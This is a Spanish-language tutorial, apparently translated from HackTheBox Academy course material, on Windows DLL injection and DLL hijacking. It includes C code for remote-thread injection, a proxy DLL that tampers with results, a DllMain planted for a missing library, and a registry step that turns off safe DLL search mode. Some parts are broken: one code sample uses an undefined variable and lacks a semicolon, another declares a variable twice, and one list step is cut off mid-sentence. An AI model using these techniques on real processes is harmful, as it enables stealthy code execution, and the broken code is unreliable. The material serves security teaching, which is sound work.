
# DLL Injection

`DLL injection` es un método que implica insertar un fragmento de código, estructurado como una biblioteca de vínculos dinámicos (DLL), en un proceso en ejecución. Esta técnica permite que el código insertado se ejecute dentro del contexto del proceso, influyendo así en su comportamiento o accediendo a sus recursos.

`DLL injection` se puede encontrar en aplicaciones legítimas en varias áreas. Por ejemplo, los desarrolladores de software aprovechan esta tecnología para `hot patching`, un método que permite la modificación o actualización de código sin problemas, sin la necesidad de reiniciar el proceso en curso de inmediato. Un excelente ejemplo de esto es [el uso de hot patching de Azure para actualizar servidores operativos](https://learn.microsoft.com/en-us/azure/automanage/automanage-hotpatch#how-hotpatch-works) , lo que facilita los beneficios de la actualización sin necesidad de tiempo de inactividad del servidor.

Sin embargo, no es completamente inocuo. Los cibercriminales suelen manipular `DLL injection`para insertar código malicioso en procesos de confianza. Esta técnica es especialmente eficaz para evadir la detección del software de seguridad.

Existen varios métodos diferentes para ejecutar una inyección de DLL.

## <mark style="color:purple;">LoadLibrary</mark>

`LoadLibrary` es un método ampliamente utilizado para la inyección de DLL, que emplea la API `LoadLibrary` para cargar la DLL en el espacio de direcciones del proceso de destino.

La `LoadLibrary`API es una función proporcionada por el sistema operativo Windows que carga una biblioteca de vínculos dinámicos (DLL) en la memoria del proceso actual y devuelve un identificador que puede usarse para obtener las direcciones de las funciones dentro de la DLL.

El primer ejemplo muestra cómo se puede utilizar `LoadLibrary` para cargar una DLL en el proceso actual de forma legítima:

Código: c

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Usando LoadLibrary para cargar una DLL en el proceso actual
    HMODULE hModule = LoadLibrary("example.dll");
    if (hModule == NULL) {
        printf("Failed to load example.dll\n");
        return -1;
    }
    printf("Successfully loaded example.dll\n");

    return 0;
}
```

El segundo ejemplo ilustra el uso de `LoadLibrary` para la inyección de DLL. Este proceso implica asignar memoria dentro del proceso de destino para la ruta de la DLL y luego iniciar un subproceso remoto que comienza en la ruta de la DLL `LoadLibrary` y se dirige hacia ella:

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Usando LoadLibrary para inyección de DLL
    // Primero, necesitamos controlar el proceso objetivo
    DWORD targetProcessId = 123456 // El ID del proceso objetivo.
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
    if (hProcess == NULL) {
        printf("Failed to open target process\n");
        return -1;
    }

    // A continuación, necesitamos asignar memoria en el proceso de destino para la ruta de la DLL.
    LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (dllPathAddressInRemoteMemory == NULL) {
        printf("Failed to allocate memory in target process\n");
        return -1;
    }

    // Escribimos la ruta de la DLL a la memoria asignada en el proceso de destino
    BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);
    if (!succeededWriting) {
        printf("Failed to write DLL path to target process\n");
        return -1;
    }

    // Obtenemos la dirección de LoadLibrary en kernel32.dll
    LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if (loadLibraryAddress == NULL) {
        printf("Failed to get address of LoadLibraryA\n");
        return -1;
    }

    // Creamos un subproceso remoto en el proceso de destino que comience en LoadLibrary y apunte a la ruta de la DLL
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create remote thread in target process\n");
        return -1;
    }

    printf("Successfully injected example.dll into target process\n");

    return 0;
}
```

***

## <mark style="color:purple;">Mapeo manual</mark>

`Manual Mapping` es un método increíblemente complejo y avanzado de inyección de DLL. Implica la carga manual de una DLL en la memoria de un proceso y resuelve sus importaciones y reubicaciones. Sin embargo, evita la detección fácil al no utilizar la función `LoadLibrary`, cuyo uso es monitoreado por sistemas de seguridad y antivirus.

Un esquema simplificado del proceso puede representarse de la siguiente manera:

1. Cargue la DLL como datos sin procesar en el proceso de inyección.
2. Asigne las secciones de DLL al proceso de destino.
3. Inyectar el shellcode en el proceso de destino y ejecutarlo. Este shellcode reubica la DLL, rectifica las importaciones, ejecuta las devoluciones de llamadas de Thread Local Storage (TLS) y, por último, llama a la DLL principal.

***

## <mark style="color:purple;">Inyección de DLL reflexiva</mark>

`Reflective DLL injection` es una técnica que utiliza programación reflexiva para cargar una biblioteca desde la memoria a un proceso host. La biblioteca en sí es responsable de su proceso de carga implementando un cargador de archivos ejecutable portátil (PE) mínimo. Esto le permite decidir cómo se cargará e interactuará con el host, minimizando la interacción con el sistema y el proceso host.

[Stephen Fewer tiene un excelente GitHub](https://github.com/stephenfewer/ReflectiveDLLInjection) que demuestra la técnica. A continuación, se reproduce su explicación:

> "El procedimiento para inyectar de forma remota una biblioteca en un proceso es doble. En primer lugar, la biblioteca que se pretende inyectar debe estar escrita en el espacio de direcciones del proceso de destino (en adelante denominado "proceso host"). En segundo lugar, la biblioteca debe cargarse en el proceso host para cumplir con las expectativas de tiempo de ejecución de la biblioteca, como resolver sus importaciones o reubicarla en una ubicación adecuada en la memoria.

Suponiendo que tenemos ejecución de código en el proceso host y la biblioteca que pretendemos inyectar se ha escrito en una ubicación de memoria arbitraria en el proceso host, la inyección de DLL reflectante funciona de la siguiente manera.

1. El control de ejecución se transfiere a la función reflectante de la biblioteca, una función exportada que se encuentra en la tabla de exportación de la biblioteca. Esto puede suceder a través de&#x20;
2. El control de ejecución se transfiere a la función `ReflectiveLoader` de la biblioteca, una función exportada que se encuentra en la tabla de exportación de la biblioteca. Esto puede suceder mediante `CreateRemoteThread()`un shellcode de arranque mínimo.
3. Como la imagen de la biblioteca reside actualmente en una ubicación de memoria arbitraria, `ReflectiveLoader` inicialmente calcula la ubicación de memoria actual de su propia imagen para analizar sus propios encabezados para su uso posterior.
4. Luego `ReflectiveLoader`, analiza la tabla de exportación del proceso host `kernel32.dll` para calcular las direcciones de tres funciones que necesita el cargador, a saber `LoadLibraryA`, `GetProcAddress`, y `VirtualAlloc`.
5. Ahora `ReflectiveLoader` asigna una región de memoria continua donde se cargará su propia imagen. La ubicación no es crucial; el cargador reubicará correctamente la imagen más adelante.
6. Los encabezados y secciones de la biblioteca se cargan en sus nuevas ubicaciones de memoria.
7. Luego, `ReflectiveLoader` procesa la copia recién cargada de la tabla de importación de su imagen, carga cualquier biblioteca adicional y resuelve sus respectivas direcciones de función importadas.
8. Luego `ReflectiveLoader` procesa la copia recién cargada de la tabla de reubicación de su imagen.
9. Luego `ReflectiveLoader` llama a la función de punto de entrada de la imagen recién cargada, `DllMain,` con `DLL_PROCESS_ATTACH`. La biblioteca se ha cargado correctamente en la memoria.
10. Finalmente, la ejecución de `ReflectiveLoader` retorna al shellcode de arranque inicial que lo llamó, o si se llamó a través de `CreateRemoteThread`, el hilo finalizaría.

***

## <mark style="color:purple;">DLL Hijacking</mark>

`DLL Hijacking` es una técnica de explotación en la que un atacante aprovecha el proceso de carga de DLL de Windows. Estas DLL se pueden cargar durante el tiempo de ejecución, lo que crea una oportunidad de secuestro si una aplicación no especifica la ruta completa a una DLL requerida, lo que la hace susceptible a este tipo de ataques.

El orden de búsqueda de DLL predeterminado que utiliza el sistema depende de si `Safe DLL Search Mode` está activado o no. Cuando está activado (que es la configuración predeterminada), el modo de búsqueda segura de DLL reubica el directorio actual del usuario más abajo en el orden de búsqueda. Es fácil habilitar o deshabilitar la configuración editando el registro.

1. Presione `Windows + R` para abrir el cuadro de diálogo Ejecutar.
2. Escriba `Regedit` y presione `Enter`. Esto abrirá el Editor del Registro.
3. Navegar a `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager`.
4. En el panel derecho, busque el valor `SafeDllSearchMode`. Si no existe, haga clic derecho en el espacio en blanco de la carpeta o haga clic derecho en la carpeta `Session Manager`, seleccione `New` y luego `DWORD (32-bit) Value`. Nombre este nuevo valor como `SafeDllSearchMode`.
5. Haga doble clic en `SafeDllSearchMode`. En el campo Datos del valor, introduzca `1`para habilitar o `0` para deshabilitar el modo de búsqueda segura de DLL.
6. Haga clic en `OK`, cierre el Editor del Registro y reinicie el sistema para que los cambios surtan efecto.

Con este modo habilitado, las aplicaciones buscan los archivos DLL necesarios en la siguiente secuencia:

1. El directorio desde el que se carga la aplicación.
2. El directorio del sistema.
3. El directorio del sistema de 16 bits.
4. El directorio de Windows.
5. El directorio actual.
6. Los directorios que aparecen enumerados en la variable de entorno PATH.

Sin embargo, si el 'Modo de búsqueda segura de DLL' está desactivado, el orden de búsqueda cambia a:

1. El directorio desde el que se carga la aplicación.
2. El directorio actual.
3. El directorio del sistema.
4. El directorio del sistema de 16 bits.
5. El directorio de Windows
6. Los directorios que se enumeran en la variable de entorno PATH

El secuestro de DLL implica unos cuantos pasos más. En primer lugar, debe identificar la DLL que el objetivo está intentando localizar. Hay herramientas específicas que pueden simplificar esta tarea:

1. `Process Explorer`: Esta herramienta, que forma parte de la suite Sysinternals de Microsoft, ofrece información detallada sobre los procesos en ejecución, incluidas las DLL cargadas. Si selecciona un proceso e inspecciona sus propiedades, podrá ver sus DLL.
2. `PE Explorer`: Este explorador de archivos ejecutables portátiles (PE) puede abrir y examinar un archivo PE (como un .exe o .dll). Entre otras funciones, revela las DLL desde las que el archivo importa funcionalidad.

Después de identificar una DLL, el siguiente paso es determinar qué funciones desea modificar, lo que requiere herramientas de ingeniería inversa, como desensambladores y depuradores. Una vez que se han identificado las funciones y sus firmas, es momento de construir la DLL.

Tomemos un ejemplo práctico. Considere el programa en C que se muestra a continuación:

Código: c

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <windows.h>

typedef int (*AddFunc)(int, int);

int readIntegerInput()
{
    int value;
    char input[100];
    bool isValid = false;

    while (!isValid)
    {
        fgets(input, sizeof(input), stdin);

        if (sscanf(input, "%d", &value) == 1)
        {
            isValid = true;
        }
        else
        {
            printf("Invalid input. Please enter an integer: ");
        }
    }

    return value;
}

int main()
{
    HMODULE hLibrary = LoadLibrary("library.dll");
    if (hLibrary == NULL)
    {
        printf("Failed to load library.dll\n");
        return 1;
    }

    AddFunc add = (AddFunc)GetProcAddress(hLibrary, "Add");
    if (add == NULL)
    {
        printf("Failed to locate the 'Add' function\n");
        FreeLibrary(hLibrary);
        return 1;
    }
    HMODULE hLibrary = LoadLibrary("x.dll");

    printf("Enter the first number: ");
    int a = readIntegerInput();

    printf("Enter the second number: ");
    int b = readIntegerInput();

    int result = add(a, b);
    printf("The sum of %d and %d is %d\n", a, b, result);

    FreeLibrary(hLibrary);
    system("pause");
    return 0;
}
```

Carga una función `add` del `library.dll` y utiliza esta función para sumar dos números. Posteriormente, imprime el resultado de la suma. Examinando el programa en Process Monitor (procmon), podemos observar el proceso de carga del `library.dll` ubicado en el mismo directorio.

Primero, configuremos un filtro en procmon para incluir únicamente `main.exe`, que es el nombre del proceso del programa. Este filtro nos ayudará a centrarnos específicamente en las actividades relacionadas con la ejecución de `main.exe`. Es importante tener en cuenta que procmon solo captura información mientras se está ejecutando activamente. Por lo tanto, si su registro aparece vacío, debe cerrar `main.exe`y volver a abrirlo mientras procmon se está ejecutando. Esto garantizará que se capture la información necesaria y esté disponible para su análisis.

![imagen](https://academy.hackthebox.com/storage/modules/67/procmon.png)

Luego, si te desplazas hasta la parte inferior, podrás ver la llamada a load `library.dll`.

![imagen](https://academy.hackthebox.com/storage/modules/67/procmon-loadimage.png)

Podemos filtrar aún más por una operación de carga de imagen para obtener solo las bibliotecas que la aplicación está cargando.

```shell-session
16:13:30,0074709	main.exe	47792	Load Image	C:\Users\PandaSt0rm\Desktop\Hijack\main.exe	SUCCESS	Image Base: 0xf60000, Image Size: 0x26000
16:13:30,0075369	main.exe	47792	Load Image	C:\Windows\System32\ntdll.dll	SUCCESS	Image Base: 0x7ffacdbf0000, Image Size: 0x214000
16:13:30,0075986	main.exe	47792	Load Image	C:\Windows\SysWOW64\ntdll.dll	SUCCESS	Image Base: 0x77a30000, Image Size: 0x1af000
16:13:30,0120867	main.exe	47792	Load Image	C:\Windows\System32\wow64.dll	SUCCESS	Image Base: 0x7ffacd5a0000, Image Size: 0x57000
16:13:30,0122132	main.exe	47792	Load Image	C:\Windows\System32\wow64base.dll	SUCCESS	Image Base: 0x7ffacd370000, Image Size: 0x9000
16:13:30,0123231	main.exe	47792	Load Image	C:\Windows\System32\wow64win.dll	SUCCESS	Image Base: 0x7ffacc750000, Image Size: 0x8b000
16:13:30,0124204	main.exe	47792	Load Image	C:\Windows\System32\wow64con.dll	SUCCESS	Image Base: 0x7ffacc850000, Image Size: 0x16000
16:13:30,0133468	main.exe	47792	Load Image	C:\Windows\System32\wow64cpu.dll	SUCCESS	Image Base: 0x77a20000, Image Size: 0xa000
16:13:30,0144586	main.exe	47792	Load Image	C:\Windows\SysWOW64\kernel32.dll	SUCCESS	Image Base: 0x76460000, Image Size: 0xf0000
16:13:30,0146299	main.exe	47792	Load Image	C:\Windows\SysWOW64\KernelBase.dll	SUCCESS	Image Base: 0x75dd0000, Image Size: 0x272000
16:13:31,7974779	main.exe	47792	Load Image	C:\Users\PandaSt0rm\Desktop\Hijack\library.dll	SUCCESS	Image Base: 0x6a1a0000, Image Size: 0x1d000
```

### Proxy

Podemos utilizar un método conocido como DLL Proxying para ejecutar un secuestro. Crearemos una nueva biblioteca que cargará la función `Add` desde `library.dll`, la manipulará y luego la devolverá a `main.exe`.

1. Crear una nueva biblioteca: crearemos una nueva biblioteca que sirva como proxy para `library.dll`. Esta biblioteca contendrá el código necesario para cargar la función `Add` en  `library.dll`y realizar la manipulación necesaria.
2. Cargar la función `Add`: Dentro de la nueva librería cargaremos la función `Add` de la original `library.dll`. Esto nos permitirá acceder a la función original.
3. Modificar la función: Una vez cargada la función `Add`, podemos aplicar las modificaciones o manipulaciones que queramos a su resultado. En este caso, simplemente vamos a modificar el resultado de la suma, para añadir `+ 1`al resultado.
4. Devolver la función modificada: después de completar el proceso de manipulación, devolveremos la función `Add` modificada desde la nueva biblioteca a `main.exe`. Esto garantizará que, cuando `main.exe` invoque la función `Add`, se ejecutará la versión modificada con los cambios previstos.

El código es el siguiente:

Código: c

```c
// tamper.c
#include <stdio.h>
#include <Windows.h>

#ifdef _WIN32
#define DLL_EXPORT __declspec(dllexport)
#else
#define DLL_EXPORT
#endif

typedef int (*AddFunc)(int, int);

DLL_EXPORT int Add(int a, int b)
{
    // Load the original library containing the Add function
    HMODULE originalLibrary = LoadLibraryA("library.o.dll");
    if (originalLibrary != NULL)
    {
        // Get the address of the original Add function from the library
        AddFunc originalAdd = (AddFunc)GetProcAddress(originalLibrary, "Add");
        if (originalAdd != NULL)
        {
            printf("============ HIJACKED ============\n");
            // Call the original Add function with the provided arguments
            int result = originalAdd(a, b);
            // Tamper with the result by adding +1
            printf("= Adding 1 to the sum to be evil\n");
            result += 1;
            printf("============ RETURN ============\n");
            // Return the tampered result
            return result;
        }
    }
    // Return -1 if the original library or function cannot be loaded
    return -1;
}
```

Compílelo o utilice la versión precompilada proporcionada. Cambie el nombre de `library.dll` a `library.o.dll` y cambie el nombre de `tamper.dll` a `library.dll`.

Al ejecutar `main.exe`se muestra el hackeo exitoso.

![imagen](https://academy.hackthebox.com/storage/modules/67/proxy.png)

### Bibliotecas no válidas

Otra opción para ejecutar un ataque de secuestro de DLL es reemplazar una biblioteca válida que el programa intenta cargar pero no puede encontrar con una biblioteca creada. Si cambiamos el filtro de procmon para enfocarnos en las entradas cuya ruta termina en `.dll` y tiene un estado de `NAME NOT FOUND` podemos encontrar dichas bibliotecas en `main.exe`.

![imagen](https://academy.hackthebox.com/storage/modules/67/procmon-not-found.png)

Como sabemos, `main.exe` busca en muchas ubicaciones buscando `x.dll`, pero no se encuentra en ninguna parte. La entrada que nos interesa especialmente es:

```shell-session
17:55:39,7848570	main.exe	37940	CreateFile	C:\Users\PandaSt0rm\Desktop\Hijack\x.dll	NAME NOT FOUND	Desired Access: Read Attributes, Disposition: Open, Options: Open Reparse Point, Attributes: n/a, ShareMode: Read, Write, Delete, AllocationSize: n/a
```

Buscamos cargar `x.dll` desde el directorio de la aplicación. Podemos aprovechar esto y cargar nuestro propio código, con muy poco contexto de lo que busca en `x.dll`.

Código: c

```c
#include <stdio.h>
#include <Windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        printf("Hijacked... Oops...\n");
    }
    break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}
```

Este código define una función de punto de entrada de DLL `DllMain` que Windows llama automáticamente cuando se carga la DLL en un proceso. Cuando se carga la biblioteca, simplemente se imprime `Hijacked... Oops...` en la terminal, pero en teoría podría hacer cualquier cosa aquí.

Compílelo o utilice la versión precompilada proporcionada. Cambie el nombre `hijack.dll` a `x.dll` y ejecute `main.exe`.

![imagen](https://academy.hackthebox.com/storage/modules/67/hijack.png)
